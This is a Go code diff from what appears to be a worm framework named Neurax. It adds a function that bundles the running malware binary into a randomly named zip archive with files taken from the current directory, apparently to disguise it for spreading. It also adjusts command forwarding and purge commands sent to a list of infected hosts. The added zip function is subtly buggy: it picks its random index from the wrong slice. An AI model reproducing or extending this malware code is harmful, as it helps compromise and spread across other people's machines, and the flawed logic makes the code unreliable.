@@ -5,6 +5,7 @@ import (
 	"bytes"
 	"fmt"
 	"io/ioutil"
+	"math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -225,7 +226,6 @@ func handle_command(cmd string) {
 			for _, host := range InfectedHosts {
 				err := DataSender(host, NeuraxConfig.comm_port, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
 				ReportError("Cannot send command", err)
-				V
 			}
 		}
 		if strings.Contains(preamble, "r") {
@@ -342,9 +342,25 @@ func NeuraxDisks() error {
 	return nil
 }
 
-func gen_haiku() {
+func NeuraxZIP(num_files int) error {
+	archive_name := gen_haiku() + ".zip"
+	files_to_zip := []string{os.Args[0]}
+	files, err := coldfire.CurrentDirFiles()
+	if err != nil {
+		return err
+	}
+	for i := 0; i < num_files; i++ {
+		index := rand.Intn(len(files_to_zip))
+		files_to_zip = append(files_to_zip, files[index])
+		files[index] = files[len(files)-1]
+		files = files[:len(files)-1]
+	}
+	return coldfire.MakeZip(archive_name, files_to_zip)
+}
+
+func gen_haiku() string {
 	haikunator := haikunator.New(time.Now().UTC().UnixNano())
-	selected_name := haikunator.Haikunate()
+	return haikunator.Haikunate()
 }
 
 func NeuraxPurge() {
@@ -354,7 +370,7 @@ func NeuraxPurge() {
 	}
 	for _, host := range InfectedHosts {
 		err := DataSender(host, NeuraxConfig.comm_port, "purge")
-		ReportError(err)
+		ReportError("Cannot perform purge", err)
 	}
 	handle_command("purge")
 }
